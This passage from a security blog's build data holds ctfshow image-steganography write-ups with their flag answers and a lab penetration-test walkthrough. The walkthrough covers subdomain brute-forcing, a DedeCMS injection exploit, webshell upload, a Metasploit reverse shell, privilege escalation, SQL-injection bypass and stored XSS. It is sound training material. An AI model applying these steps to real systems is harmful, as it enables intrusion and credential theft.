href="https://www.jianshu.com/p/4fabac6b15b3" target="_blank" rel="noopener noreferrer">GIF 字节格式<ExternalLinkIcon/></a></p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717050.gif" data="aurora"></p>\n<blockquote>\n<p>474946383961 文件头后是宽高</p>\n</blockquote>\n<blockquote>\n<p><strong>注意点</strong> 还有 Image Seperator里的下一帧宽高也需要改</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717123.gif" data="aurora"></p>\n<blockquote>\n<p>这里插一句 gif动图是一帧一帧图片结合起来的 所以每一帧动图都会有Graphics Control Extension 和 Image Descriptor 9021 F9 04 01 32 00 02 00 2C 00 00 00 00 84 03 96 00 87</p>\n</blockquote>\n<blockquote>\n<p>所以呢 改图片需要将整合图片的宽高和每一帧的宽高都要一起改</p>\n</blockquote>\n<blockquote>\n<p>我直接搜索相同宽高一起改就完事了（跟bmp图片文件一样 宽高是倒的 倒着读就行）</p>\n</blockquote>\n<blockquote>\n<p>这里引入stegsolve 图片查看器</p>\n</blockquote>\n<h3 id="misc29" tabindex="-1"><a class="header-anchor" href="#misc29" aria-hidden="true">#</a> misc29</h3>\n<blockquote>\n<p>也是gif文件格式 根据题目修改高 记得每一帧的高都要修改</p>\n</blockquote>\n<blockquote>\n<p>保存以后发现是一张动图，这里就用到了stegsolve工具 analyse模块中frame browser （动图帧格式预览）一帧一帧查看 就获得了</p>\n</blockquote>\n<h3 id="misc30" tabindex="-1"><a class="header-anchor" href="#misc30" aria-hidden="true">#</a> misc30</h3>\n<blockquote>\n<p>还是bmp图片格式 所以按照题目要求修改 宽度950 （3B6）就行 注意得倒着写</p>\n</blockquote>\n<h3 id="misc31" tabindex="-1"><a class="header-anchor" href="#misc31" aria-hidden="true">#</a> misc31</h3>\n<blockquote>\n<p>Bmp图片格式 按照要求高度是对的 修改宽度 根据字节数手搓宽度 注意字节数得除以3才得到像素，因为三原色 但是求解的宽度不是整数需要向下取整</p>\n</blockquote>\n<h3 id="misc32" tabindex="-1"><a class="header-anchor" href="#misc32" aria-hidden="true">#</a> misc32</h3>\n<blockquote>\n<p>考察了png 的crc检验 把文件放到脚本里去跑得出宽和高</p>\n</blockquote>\n<h3 id="misc33" tabindex="-1"><a class="header-anchor" href="#misc33" aria-hidden="true">#</a> misc33</h3>\n<blockquote>\n<p>和上题一样 跑脚本</p>\n</blockquote>\n<h3 id="misc34" tabindex="-1"><a class="header-anchor" href="#misc34" aria-hidden="true">#</a> misc34</h3>\n<blockquote>\n<p>根据提示用脚本遍历宽度就行</p>\n</blockquote>\n<h3 id="miscc35" tabindex="-1"><a class="header-anchor" href="#miscc35" aria-hidden="true">#</a> miscc35</h3>\n<blockquote>\n<p>不能理解为什么高度也会被改掉</p>\n</blockquote>\n<blockquote>\n<p>那么既然改了为什么高度是600</p>\n</blockquote>\n<blockquote>\n<p>那如果遍历高度和宽度呢</p>\n</blockquote>\n<blockquote>\n<p>发现数据量过于庞大 然后上网搜了下 如何批量检测损坏文件</p>\n</blockquote>\n<blockquote>\n<p>引入imghdr库 但是跑出来的甚至是修改好的 也是被检测出来是损坏的 本来题目给的就是损坏文件</p>\n</blockquote>\n<p>这道题</p>\n<p>这边跑脚本的时候注意 宽高所占的字节数 一个十六进制字母占到0.5个字节 一般这个位置是2-4个字节 如果2个字节的话要用短整型（h） 如果4个字节的话要用整型（i）struct.pack(\'&gt;h\',i)如果像bmp是倒着写的可以[::-1]</p>\n<h3 id="misc36" tabindex="-1"><a class="header-anchor" href="#misc36" aria-hidden="true">#</a> misc36</h3>\n<blockquote>\n<p>和上一道同理，如果出现有图像但是不是所需要的图像可以考虑改大图片的高，或许就有用呢，一般高度改了确实能隐藏，跑的脚本在文件下。</p>\n</blockquote>\n<h3 id="misc37" tabindex="-1"><a class="header-anchor" href="#misc37" aria-hidden="true">#</a> misc37</h3>\n<blockquote>\n<p>打开文件是发现是动图，提示也是flag在图片里所以gif一张一张分离，用stegsolve analyse frame browser ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p>\n</blockquote>\n<h3 id="misc38" tabindex="-1"><a class="header-anchor" href="#misc38" aria-hidden="true">#</a> misc38</h3>\n<blockquote>\n<p>提示是还是flag在图片里，打开后发现是个png文件，看了wp以后才知道这个提示是要先png转到gif格式  工具<a href="https://cdkm.com/cn/png-to-gif" target="_blank" rel="noopener noreferrer">png转gif工具<ExternalLinkIcon/></a> 然后和上一题同样操作就行了</p>\n</blockquote>\n<p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p>\n<blockquote>\n<p>使用apngdis.exe（APNG Disassembler）工具分离文件也可</p>\n</blockquote>\n<h3 id="misc39" tabindex="-1"><a class="header-anchor" href="#misc39" aria-hidden="true">#</a> misc39</h3>\n<blockquote>\n<p>提示是flag如流水，图片帧间隔时间隐写，identify -format &quot;%T &quot; misc39.gif &gt; 1.txt</p>\n</blockquote>\n<blockquote>\n<p>这个实在看不懂了网上找吧</p>\n</blockquote>\n<blockquote>\n<p>flag一般是32位的加上格式是41位，</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717268.gif" data="aurora"></p>\n<blockquote>\n<p>可以看到3637循环，可以想到01二进制循环，第一位是37 所以37为1，36为0</p>\n</blockquote>\n<blockquote>\n<p>转化为287，287 /41=7 所以7位为一组，转化字符串类型 然后flag就是转化后的字符串</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/misc/misc2.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"misc2",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/misc/misc2.md",filePathRelative:"misc/misc2.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc2.html.vue",componentFilePathRelative:"pages/misc/misc2.html.vue",componentFileChunkName:"v-7db590bd",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/misc/misc2.html.js",dataFilePathRelative:"pages/misc/misc2.html.js",dataFileChunkName:"v-7db590bd",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/misc/misc2.html",htmlFilePathRelative:"misc/misc2.html"},{data:{key:"v-1c1db1bc",path:"/penetration/4.html",title:"暗月项目四（完整渗透测试）",lang:"zh-CN",frontmatter:{date:"2023/7/1 19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"暗月项目四（完整渗透测试）",tag:["渗透测试"],categories:["渗透测试","提权","网站"]},excerpt:"",headers:[{level:3,title:"项目四（完整渗透测试）",slug:"项目四-完整渗透测试",children:[]},{level:2,title:"主机扫描",slug:"主机扫描",children:[{level:3,title:"(1)nmap-sn",slug:"_1-nmap-sn",children:[]},{level:3,title:"(2)netdiscover -i",slug:"_2-netdiscover-i",children:[]}]},{level:2,title:"端口扫描",slug:"端口扫描",children:[]},{level:2,title:"改dns服务器地址",slug:"改dns服务器地址",children:[]},{level:2,title:"wfuzz爆破子域名",slug:"wfuzz爆破子域名",children:[]},{level:2,title:"第一个网站的渗透（new.）",slug:"第一个网站的渗透-new",children:[]},{level:2,title:"第二个域名渗透（ww2）",slug:"第二个域名渗透-ww2",children:[{level:3,title:"gobuster 目录扫描",slug:"gobuster-目录扫描",children:[]},{level:3,title:"sql注入漏洞",slug:"sql注入漏洞",children:[]}]}],git:{}},key:"v-1c1db1bc",path:"/penetration/4.html",title:"暗月项目四（完整渗透测试）",lang:"zh-CN",frontmatter:{date:"2023/7/1 19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"暗月项目四（完整渗透测试）",tag:["渗透测试"],categories:["渗透测试","提权","网站"]},excerpt:"",headers:[{level:3,title:"项目四（完整渗透测试）",slug:"项目四-完整渗透测试",children:[]},{level:2,title:"主机扫描",slug:"主机扫描",children:[{level:3,title:"(1)nmap-sn",slug:"_1-nmap-sn",children:[]},{level:3,title:"(2)netdiscover -i",slug:"_2-netdiscover-i",children:[]}]},{level:2,title:"端口扫描",slug:"端口扫描",children:[]},{level:2,title:"改dns服务器地址",slug:"改dns服务器地址",children:[]},{level:2,title:"wfuzz爆破子域名",slug:"wfuzz爆破子域名",children:[]},{level:2,title:"第一个网站的渗透（new.）",slug:"第一个网站的渗透-new",children:[]},{level:2,title:"第二个域名渗透（ww2）",slug:"第二个域名渗透-ww2",children:[{level:3,title:"gobuster 目录扫描",slug:"gobuster-目录扫描",children:[]},{level:3,title:"sql注入漏洞",slug:"sql注入漏洞",children:[]}]}],content:'\r\n### 项目四（完整渗透测试）\r\n\r\n## 主机扫描\r\n\r\n### (1)nmap-sn\r\n\r\n![image-20230611205450303](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112054777.png)\r\n\r\n### (2)netdiscover -i\r\n\r\n![image-20230611205651833](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112056939.png)\r\n\r\n## 端口扫描\r\n\r\n首先用masscan扫描\r\n\r\n![image-20230611210309546](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112103816.png)\r\n\r\n然后再用nmap进行端口探测\r\n\r\n![image-20230612150949554](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121509909.png)\r\n\r\n通过对端口的解析，可以看每个端口对应的服务\r\n\r\n## 改dns服务器地址\r\n\r\n发现是由dns53 端口开启的，靶机应该是有dns服务的，所以要先把dns服务器改成靶机地址\r\n\r\n（1）Windows\r\n\r\n![image-20230612154425537](C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230612154425537.png)\r\n\r\n（2）kali\r\n\r\n /etc/resolv.conf\r\n\r\n![image-20230612160048638](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121600839.png)\r\n\r\n## wfuzz爆破子域名\r\n\r\nwfuzz学习地址[wfuzz学习_wfuzz参数_](https://blog.csdn.net/qq_45869039/article/details/108874749)\r\n\r\n/usr/share/amass/wordlists/subdomains-top1mil-110000.txt kali自带的子域名爆破字典\r\n\r\n![image-20230612160330695](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121603759.png)\r\n\r\nnew www ww2 WWW \r\n\r\n## 第一个网站的渗透（new.）\r\n\r\n![image-20230625095057736](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306250951130.png)\r\n\r\n是一个dedecms类型网站 \r\n\r\n一般dedecms是有固定的目录结构的，那么根据目录结构能访问到其他页面\r\n\r\n如果像我这种小白不了解dedecms的话，可以先扫描一遍该网站的目录结构\r\n\r\n用[dirbuster]([(54条消息) Web渗透之信息收集——目录扫描从御剑到Dirbuster_Mr. Wanderer的博客-CSDN博客](https://blog.csdn.net/Mr_Wanderer/article/details/107410457))先扫描一边网站目录 用御剑效果差不多，看在本机还是kali里完成实验了\r\n\r\n![image-20230625100119420](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251001538.png)\r\n\r\n查看dedecms版本号，网上找对应的exp，\r\n\r\n版本号的相对路径：/data/admin/ver.txt\r\n\r\n![image-20230625100820990](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251008176.png)\r\n\r\n20150618是存在漏洞的 [Dedecms 20150618 注入漏洞](http://www.hekaiyu.cn/hacker/3060.html)\r\n\r\n根据文章实现exp\r\n\r\nmember模块开启，可以注册登录\r\n\r\n![image-20230625101514441](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251015609.png)\r\n\r\n先注册一个账号\r\n\r\n增加一个分类![image-20230625171115401](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711750.png)\r\n\r\n利用给的exp能跑出admin账号的密码md5值\r\n\r\n该exp需要获取一个登录账号的cookie（requests包中） 需要在python2环境下运行\r\n\r\n![image-20230625171131658](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711785.png)\r\n\r\n获得admin账号密码进行登录\r\n\r\n![image-20230625171627055](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251716192.png)\r\n\r\n获取权限后上传小马\r\n\r\n![image-20230706171558794](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307061716006.png)\r\n\r\n拿蚁剑连后上传大马（ASPXSpy2014.aspx admin）查看是否可执行cmd文件，然后开始提权\r\n\r\n![image-20230724110742886](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241107956.png)\r\n\r\n生成攻击载荷\r\n\r\n![image-20230724104346468](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241043543.png)\r\n\r\n查看服务器可写目录，然后上传攻击载荷\r\n\r\n![image-20230724104545057](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241045107.png)\r\n\r\n反弹shell\r\n\r\n![image-20230724111207836](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241112877.png)\r\n\r\n有关msfconsole的使用可以重开一篇\r\n\r\n![image-20230724145454737](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241454779.png)\r\n\r\n监听后连上\r\n\r\n然后提权 首先用use post/multi/recon/local_exploit_suggester跑一边可以利用的exp\r\n\r\n![image-20230725220840944](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252208247.png)\r\n\r\n跑完以后就看模块利用 不会使用模块可以百度一下\r\n\r\n![image-20230725221029006](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252210072.png)\r\n\r\n提成功了获得系统权限\r\n\r\n然后找flag 可以先在meterpreter下先 `search -f *flag*`\r\n\r\n![image-20230726103234108](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261032479.png)\r\n\r\n然后再进入shell 查看内容（玄学卡实在不行重新弹一个shell回来）\r\n\r\n![image-20230726103315356](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261033400.png)\r\n\r\n \r\n\r\n## 第二个域名渗透（ww2）\r\n\r\n### gobuster 目录扫描\r\n\r\n感觉和dirbuster效果差也差不多， 具体操作 相对可以\r\n\r\n![image-20230731100905532](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311009701.png)\r\n\r\n比dirbuster功能相对多一点，能扫dns，fuzz，tftp？ 我感觉需要一个相对清楚的目录结构，dirbuster可能会更适合一点，如果是查看该网站有什么特定类型文件，那就gobuster，当然功能性上也是gobuster nice\r\n\r\ngobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "aspx,html" -o ww2dir\r\n\r\n![image-20230731101327317](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311013387.png)\r\n\r\n扫完简单看一下有哪些aspx和html，html占据较大部分，有一些aspx可以实现动态交互，然后找漏洞\r\n\r\n### sql注入漏洞\r\n\r\n老的静态网站， sql语言   select\t * from ### username=‘  ’ and password = ‘#####’\r\n\r\n存在注入select\t * from ### username=‘ xxxx - - ’ and password = ‘#####’\r\n\r\n注释掉后面的代码，从而绕过\r\n\r\n![image-20230731153300162](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311533391.png)\r\n\r\nmessage.aspx存在xss漏洞\r\n\r\n![image-20230731154125653](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311541727.png)\r\n\r\n这个留言留到admin管理系统中\r\n\r\n![image-20230731154322534](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311543608.png)\r\n\r\n\r\n\r\n附一条xss常见攻击脚本[XSS攻击常识及常见的XSS攻击脚本汇总](https://www.jianshu.com/p/36b3578a6629)     和笼统危害[XSS漏洞及利用](https://zhuanlan.zhihu.com/p/353097872)\r\n\r\n本地是搭建了xsstool利用工具的  admin 1234567\r\n\r\n![image-20230731173313399](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311733681.png)\r\n',contentRendered:'<h3 id="项目四-完整渗透测试" tabindex="-1"><a class="header-anchor" href="#项目四-完整渗透测试" aria-hidden="true">#</a> 项目四（完整渗透测试）</h3>\n<h2 id="主机扫描" tabindex="-1"><a class="header-anchor" href="#主机扫描" aria-hidden="true">#</a> 主机扫描</h2>\n<h3 id="_1-nmap-sn" tabindex="-1"><a class="header-anchor" href="#_1-nmap-sn" aria-hidden="true">#</a> (1)nmap-sn</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230611205450303" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112054777.png" data="aurora"></p>\n<h3 id="_2-netdiscover-i" tabindex="-1"><a class="header-anchor" href="#_2-netdiscover-i" aria-hidden="true">#</a> (2)netdiscover -i</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230611205651833" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112056939.png" data="aurora"></p>\n<h2 id="端口扫描" tabindex="-1"><a class="header-anchor" href="#端口扫描" aria-hidden="true">#</a> 端口扫描</h2>\n<p>首先用masscan扫描</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230611210309546" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112103816.png" data="aurora"></p>\n<p>然后再用nmap进行端口探测</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612150949554" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121509909.png" data="aurora"></p>\n<p>通过对端口的解析，可以看每个端口对应的服务</p>\n<h2 id="改dns服务器地址" tabindex="-1"><a class="header-anchor" href="#改dns服务器地址" aria-hidden="true">#</a> 改dns服务器地址</h2>\n<p>发现是由dns53 端口开启的，靶机应该是有dns服务的，所以要先把dns服务器改成靶机地址</p>\n<p>（1）Windows</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612154425537" originSrc="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230612154425537.png" data="aurora"></p>\n<p>（2）kali</p>\n<p>/etc/resolv.conf</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612160048638" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121600839.png" data="aurora"></p>\n<h2 id="wfuzz爆破子域名" tabindex="-1"><a class="header-anchor" href="#wfuzz爆破子域名" aria-hidden="true">#</a> wfuzz爆破子域名</h2>\n<p>wfuzz学习地址<a href="https://blog.csdn.net/qq_45869039/article/details/108874749" target="_blank" rel="noopener noreferrer">wfuzz学习_wfuzz参数_<ExternalLinkIcon/></a></p>\n<p>/usr/share/amass/wordlists/subdomains-top1mil-110000.txt kali自带的子域名爆破字典</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230612160330695" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121603759.png" data="aurora"></p>\n<p>new www ww2 WWW</p>\n<h2 id="第一个网站的渗透-new" tabindex="-1"><a class="header-anchor" href="#第一个网站的渗透-new" aria-hidden="true">#</a> 第一个网站的渗透（new.）</h2>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625095057736" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306250951130.png" data="aurora"></p>\n<p>是一个dedecms类型网站</p>\n<p>一般dedecms是有固定的目录结构的，那么根据目录结构能访问到其他页面</p>\n<p>如果像我这种小白不了解dedecms的话，可以先扫描一遍该网站的目录结构</p>\n<p>用[dirbuster](<a href="https://blog.csdn.net/Mr_Wanderer/article/details/107410457" target="_blank" rel="noopener noreferrer">(54条消息) Web渗透之信息收集——目录扫描从御剑到Dirbuster_Mr. Wanderer的博客-CSDN博客<ExternalLinkIcon/></a>)先扫描一边网站目录 用御剑效果差不多，看在本机还是kali里完成实验了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625100119420" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251001538.png" data="aurora"></p>\n<p>查看dedecms版本号，网上找对应的exp，</p>\n<p>版本号的相对路径：/data/admin/ver.txt</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625100820990" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251008176.png" data="aurora"></p>\n<p>20150618是存在漏洞的 <a href="http://www.hekaiyu.cn/hacker/3060.html" target="_blank" rel="noopener noreferrer">Dedecms 20150618 注入漏洞<ExternalLinkIcon/></a></p>\n<p>根据文章实现exp</p>\n<p>member模块开启，可以注册登录</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625101514441" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251015609.png" data="aurora"></p>\n<p>先注册一个账号</p>\n<p>增加一个分类<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625171115401" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711750.png" data="aurora"></p>\n<p>利用给的exp能跑出admin账号的密码md5值</p>\n<p>该exp需要获取一个登录账号的cookie（requests包中） 需要在python2环境下运行</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625171131658" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711785.png" data="aurora"></p>\n<p>获得admin账号密码进行登录</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230625171627055" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251716192.png" data="aurora"></p>\n<p>获取权限后上传小马</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230706171558794" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307061716006.png" data="aurora"></p>\n<p>拿蚁剑连后上传大马（ASPXSpy2014.aspx admin）查看是否可执行cmd文件，然后开始提权</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724110742886" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241107956.png" data="aurora"></p>\n<p>生成攻击载荷</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724104346468" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241043543.png" data="aurora"></p>\n<p>查看服务器可写目录，然后上传攻击载荷</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724104545057" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241045107.png" data="aurora"></p>\n<p>反弹shell</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724111207836" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241112877.png" data="aurora"></p>\n<p>有关msfconsole的使用可以重开一篇</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724145454737" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241454779.png" data="aurora"></p>\n<p>监听后连上</p>\n<p>然后提权 首先用use post/multi/recon/local_exploit_suggester跑一边可以利用的exp</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725220840944" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252208247.png" data="aurora"></p>\n<p>跑完以后就看模块利用 不会使用模块可以百度一下</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725221029006" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252210072.png" data="aurora"></p>\n<p>提成功了获得系统权限</p>\n<p>然后找flag 可以先在meterpreter下先 <code>search -f *flag*</code></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726103234108" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261032479.png" data="aurora"></p>\n<p>然后再进入shell 查看内容（玄学卡实在不行重新弹一个shell回来）</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726103315356" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261033400.png" data="aurora"></p>\n<h2 id="第二个域名渗透-ww2" tabindex="-1"><a class="header-anchor" href="#第二个域名渗透-ww2" aria-hidden="true">#</a> 第二个域名渗透（ww2）</h2>\n<h3 id="gobuster-目录扫描" tabindex="-1"><a class="header-anchor" href="#gobuster-目录扫描" aria-hidden="true">#</a> gobuster 目录扫描</h3>\n<p>感觉和dirbuster效果差也差不多， 具体操作 相对可以</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731100905532" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311009701.png" data="aurora"></p>\n<p>比dirbuster功能相对多一点，能扫dns，fuzz，tftp？ 我感觉需要一个相对清楚的目录结构，dirbuster可能会更适合一点，如果是查看该网站有什么特定类型文件，那就gobuster，当然功能性上也是gobuster nice</p>\n<p>gobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;aspx,html&quot; -o ww2dir</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731101327317" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311013387.png" data="aurora"></p>\n<p>扫完简单看一下有哪些aspx和html，html占据较大部分，有一些aspx可以实现动态交互，然后找漏洞</p>\n<h3 id="sql注入漏洞" tabindex="-1"><a class="header-anchor" href="#sql注入漏洞" aria-hidden="true">#</a> sql注入漏洞</h3>\n<p>老的静态网站， sql语言   select\t * from ### username=‘  ’ and password = ‘#####’</p>\n<p>存在注入select\t * from ### username=‘ xxxx - - ’ and password = ‘#####’</p>\n<p>注释掉后面的代码，从而绕过</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731153300162" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311533391.png" data="aurora"></p>\n<p>message.aspx存在xss漏洞</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731154125653" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311541727.png" data="aurora"></p>\n<p>这个留言留到admin管理系统中</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731154322534" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311543608.png" data="aurora"></p>\n<p>附一条xss常见攻击脚本<a href="https://www.jianshu.com/p/36b3578a6629" target="_blank" rel="noopener noreferrer">XSS攻击常识及常见的XSS攻击脚本汇总<ExternalLinkIcon/></a>     和笼统危害<a href="https://zhuanlan.zhihu.com/p/353097872" target="_blank" rel="noopener noreferrer">XSS漏洞及利用<ExternalLinkIcon/></a></p>\n<p>本地是搭建了xsstool利用工具的  admin 1234567</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230731173313399" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311733681.png" data="aurora"></p>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/penetration/4.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"4",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/penetration/4.md",filePathRelative:"penetration/4.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/4.html.vue",componentFilePathRelative:"pages/penetration/4.html.vue",componentFileChunkName:"v-1c1db1bc",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/4.html.js",dataFilePathRelative:"pages/penetration/4.html.js",dataFileChunkName:"v-1c1db1bc",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/penetration/4.html",htmlFilePathRelative:"penetration/4.html"},{data:{key:"v-02eb67bd",path:"/penetration/",title:"渗透测试提权",lang:"zh-CN",frontmatter:{date:"2023/5/31 19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"渗透测试提权",tag:["渗透测试"],categories:["渗透测试","提权","歪比八卜"]},excerpt:"",headers:[{level:2,title:"提权篇",slug:"提权篇",children:[{level:3,title:"内核漏洞提权",slug:"内核漏洞提权",children:[]},{level:3,title:"Suid提权",slug:"suid提权",children:[]},{level:3,title:"GNU C library动态链接区$ORIGIN溢出提权",slug:"gnu-c-library动态链接区-origin溢出提权",children:[]},{level:3,title:"LINUX CRON JOBS提权",slug:"linux-cron-jobs提权",children:[]},{level:3,title:"Lpk提权",slug:"lpk提权",children:[]},{level:3,title:"zend nc提权",slug:"zend-nc提权",children:[]},{level:3,title:"Zend 反弹shell提权",slug:"zend-反弹shell提权",children:[]},{level:3,title:"Filezilla提权",slug:"filezilla提权",children:[]}]}],git:{}},key:"v-02eb67bd",path:"/penetration/",title:"渗透测试提权",lang:"zh-CN",frontmatter:{date:"2023/5/31 